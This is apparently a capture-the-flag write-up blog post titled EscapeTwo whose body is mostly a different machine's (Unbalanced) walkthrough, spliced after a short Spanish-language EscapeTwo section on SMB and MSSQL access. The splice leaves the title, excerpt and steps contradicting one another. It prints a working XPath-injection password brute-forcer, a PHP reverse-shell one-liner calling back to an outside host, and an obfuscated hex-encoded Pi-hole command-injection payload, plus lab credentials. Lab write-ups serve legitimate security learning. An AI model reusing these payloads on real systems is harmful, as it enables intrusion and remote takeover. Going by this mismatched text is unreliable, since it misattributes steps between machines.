---
layout: single
title: EscapeTwo  - Hack The Box
excerpt: "To solve Unbalanced, we'll find configuration backups files in EncFS and after cracking the password and figuring out how EncFS works, we get the Squid proxy cache manager password that let us discover internal hosts. Proxying through Squid, we then land on a login page that uses Xpath to query an XML backend database. We perform Xpath injection to retrieve the password of each user, then port forward through the SSH shell to reach a Pi-Hole instance, vulnerable to a command injection vulnerability."
date: 2025-01-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-unbalanced/unbalanced_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - rsync
  - encfs
  - squid
  - xpath
  - CVE-2020-11108
  - command injection
---

![](/assets/images/htb-writeup-unbalanced/unbalanced_logo.png)
## rose / KxEPkKe6R8su

## Portscan
nmap -Pn -sS -sC -sV -p- -T5 --max-rate 10000 -oN escape-two.txt 10.10.11.51

53/tcp    - domain       - Simple DNS Plus
  88/tcp    - kerberos-sec - Microsoft Windows Kerberos  
135/tcp   - msrpc        - Microsoft Windows RPC  
139/tcp   - netbios-ssn  - Microsoft Windows NetBIOS  
389/tcp   - ldap         - Microsoft Windows Active Directory LDAP  
445/tcp   - microsoft-ds - Posiblemente SMB  
464/tcp   - kpasswd5     - Posiblemente Kerberos  
593/tcp   - ncacn_http   - Microsoft Windows RPC over HTTP  
636/tcp   - ssl/ldap     - LDAP sobre SSL  
1433/tcp  - ms-sql-s     - Microsoft SQL Server  
3268/tcp  - ldap         - Microsoft Windows Active Directory LDAP  
3269/tcp  - ssl/ldap     - LDAP sobre SSL  
5985/tcp  - http         - Microsoft HTTPAPI (SSDP/UPnP)  
9389/tcp  - mc-nmf       - .NET Message Framing  
47001/tcp - http         - Microsoft HTTPAPI (SSDP/UPnP)  
49664-49808/tcp - msrpc - Microsoft Windows RPC (puertos dinámicos)





## Rsync & EncFS

 Bandera de usuario

Intente una enumeración básica de smb


```
poetry run python netexec.py smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares                                                     main 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ        
```

Mirando los catálogos, encontramos el Departamento de Contabilidad que nos interesa. Tenemos que descargarlo usando el comando y luego desempacarlo.

```
smbclient //escape.two.htb/Accounting\ Department -U Rose%KxEPkKe6R8su                                                                              130 ↵  

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 13:52:21 2024
  ..                                  D        0  Sun Jun  9 13:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 13:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 13:52:07 2024

                6367231 blocks of size 4096. 910811 blocks available

mget *
Get file accounting_2024.xlsx? y
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (25.7 KiloBytes/sec) (average 25.7 KiloBytes/sec)
Get file accounts.xlsx? y
getting file \accounts.xlsx of size 6780 as accounts.xlsx (19.8 KiloBytes/sec) (average 23.0 KiloBytes/sec)
``` 

ya depues de descargar lso 2 archivos viendo la extencion en gogle veo muachas aplicaiones para manipular el archivo

![](/assets/images/htb-writeup-unbalanced/xml.png)

La cuenta sa es la cuenta de administración predeterminada para conectar y administrar la base de datos MSSQL. Comprobar mostró que la cuenta es válida, intente utilizar mssqlclient de impacket para iniciar sesión.

![](/assets/images/htb-writeup-unbalanced/sql.png)

Genial, ahora somos sas. Por defecto, el procedimiento almacenado xp.cmdshell está desactivado en MSSQL, pero podemos habilitarlo y disfrutar de todos sus beneficios.

Asegúrese de buscar al anfitrión en busca de algo útil. Por ejemplo, tiene archivos notables para la implementación de MSSQL.

![](/assets/images/htb-writeup-unbalanced/sql1.png)

evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'

![](/assets/images/htb-writeup-unbalanced/evil.png)
The `squid.conf` configuration is what we'll be looking at next. Squid is an open-source caching proxy for HTTP and HTTPS traffic. The configuration contains security rules restricting access to the intranet site. From the configuration we find a hostname: `intranet.unbalanced.htb`. The configuration restricts access to the backend networks but the `acl intranet_net dst -n 172.16.0.0/12` will allow the proxy to reach that network. We don't have the IP for the  `intranet.unbalanced.htb` host but we can guess it'll be in that network.

```
# Allow access to intranet
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net

# And finally deny all other access to this proxy
http_access deny all
#http_access allow all
[...]
# No password. Actions which require password are denied.
cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
```

The configuration also contains the cachemgr password: `Thah$Sh1`

The cache manager is the component for Squid that provide reports and statistics about the Squid process running. We can interact with the cache manager over  HTTP manually but to make it a bit easier we can use the `squidclient` CLI utility. I've highlighted `fqdncache` because that's where we'll look to find the IP's of the servers behind the proxy.

![](/assets/images/htb-writeup-unbalanced/image-20200801200747899.png)

With the `squidclient -W 'Thah$Sh1' -U cachemgr -h 10.10.10.200 squidclient cache_object://intranet.unbalanced.htb mgr:fqdncache` command we'll get the cache entries, showing 3 different hosts.

![](/assets/images/htb-writeup-unbalanced/image-20200801201208461.png)

## Website

Using Burp instead of proxying directly from the browser is better because we'll be able to look at the traffic, modify requests, etc. The configuration from in Burp is shown here:

![](/assets/images/htb-writeup-unbalanced/image-20200801201823427.png)

We can now reach the intranet site through the Squid proxy. The page has a login form for the Employee Area, some package information below and a non-functional contact form at the bottom of the page.

![](/assets/images/htb-writeup-unbalanced/image-20200801202142101.png)

Unfortunately, the login doesn't return anything when we try credentials, it just reloads the same page without an **invalid credentials** error message or other indication that the page works or not. The `http://172.31.179.2/intranet.php` and `http://172.31.179.2/intranet.php` sites are exactly the same and the login form doesn't work either.

However, there's another active host not present in fqdncache that we can find by guessing the name/IP based on the other two entries: `172.31.179.1 / intranet-host1.unbalanced.htb`.

This server is configured differently and does return an invalid credential message when try to connect to it. I tried checking for SQL injection but I couldn't find anything manually or through sqlmap.

![](/assets/images/htb-writeup-unbalanced/image-20200801203244623.png)

## XPath injection

After dirbusting the site for additional clues we find an `employees.xml` file which unfortunately we can't access. However this is a hint that we are probably looking at an XML authentication backend instead of SQL, so we should now be thinking about XPath injection.

![](/assets/images/htb-writeup-unbalanced/image-20200801204925666.png)

After messing with payloads for a while I found that we can return all the entries by using the following request:

![](/assets/images/htb-writeup-unbalanced/image-20200801210131487.png)

```
<div class="w3-container"><h3>   rita       Rita</h3><p>      Fubelli</p><p>Role:       rita@unbalanced.htb</p></div>
<div class="w3-container"><h3>   Jim       Mickelson</h3><p>      jim@unbalanced.htb</p><p>Role:       Web Designer</p></div>
<div class="w3-container"><h3>   Bryan       Angstrom</h3><p>      bryan@unbalanced.htb</p><p>Role:       System Administrator</p></div>
<div class="w3-container"><h3>   Sarah       Goodman</h3><p>      sarah@unbalanced.htb</p><p>Role:       Team Leader</p></div>
```

Now we have the usernames but no password yet.

Here's the boolean script we'll use to extract the password for all 4 accounts:

```python
#!/usr/bin/python3

import requests
import string
from pwn import *

proxies = {
    "http": "10.10.10.200:3128"
}

usernames = [
    "rita",
    "jim",
    "bryan",
    "sarah"
]

def getChar(user, x, i):
    url = "http://172.31.179.1:80/intranet.php"    
    data = {"Username": user, "Password": "a' or substring(//Username[contains(.,'" + user + "')]/../Password,{0},1)='{1}']\x00".format(str(i), x)}
    r = requests.post(url, data=data, proxies=proxies)
    if len(r.text) == 7529:
        return True
    else:
        return False

charset = string.ascii_letters + string.digits + string.punctuation

for user in usernames:
    pwd = ""
    l = log.progress("Brute Forcing %s... " % user)
    log_pass = log.progress("Password: ")
    i = 1
    while True:
        canary = True
        for x in charset:
            l.status(x)
            res = getChar(user,x, i)
            if res:
                canary = False
                pwd += x
                log_pass.status(pwd)
                i += 1
                break
        if canary:
            break

l.success("DONE")
log_pass.success(pwd)
```

Running the script we get the following passwords:

![](/assets/images/htb-writeup-unbalanced/image-20200801212846920.png)

The only credentials that work over SSH are `bryan / ireallyl0vebubblegum!!!`

![](/assets/images/htb-writeup-unbalanced/image-20200801212949995.png)

## Pi-hole CVE-2020-11108

Checking the listening sockets we see something on port 5553.

![](/assets/images/htb-writeup-unbalanced/image-20200801213125467.png)

Googling port 5553 confirms what we see in the TODO file: it's running the Pi-hole:

```
bryan@unbalanced:~$ cat TODO
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO
```

The Pi-hole has an RCE CVE documented here: https://frichetten.com/blog/cve-2020-11108-pihole-rce/

I'll establish an SSH local forward with `ssh -L 9080:127.0.0.1:8080 bryan@10.10.10.200` then reach the admin interface on port 8080. Fortunately the `admin / admin` credentials work and we're able to get in.

![](/assets/images/htb-writeup-unbalanced/image-20200801213759929.png)

We'll just modify the PoC exploit with the right IP for our machine: `php -r '$sock=fsockopen("10.10.14.18",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

The final payload looks like this:

```
aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3138222C34343434293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27"));'&&
```

![](/assets/images/htb-writeup-unbalanced/image-20200801214200971.png)

![](/assets/images/htb-writeup-unbalanced/image-20200801214225678.png)

Looking around the container we find a password in the `pihole_config.sh` file:

![](/assets/images/htb-writeup-unbalanced/image-20200801214525034.png)

We can su as root with those creds and pwn the last flag:

![](/assets/images/htb-writeup-unbalanced/image-20200801214629712.png)
